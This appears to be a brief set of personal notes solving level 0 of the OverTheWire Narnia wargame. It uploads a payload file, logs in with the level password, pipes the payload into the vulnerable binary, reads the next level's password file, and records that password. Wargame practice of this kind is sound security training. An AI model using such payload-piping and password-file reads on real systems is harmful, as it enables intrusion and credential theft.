scp -P 2226 injection123.blob narnia0@narnia.labs.overthewire.org:/tmp/
narnia0

sshpass -p 'narnia0' ssh narnia0@narnia.labs.overthewire.org -p 2226

cat /tmp/injection123.blob -| ./narnia0
cat /etc/narnia_pass/narnia1

# Password: WDcYUTG5ul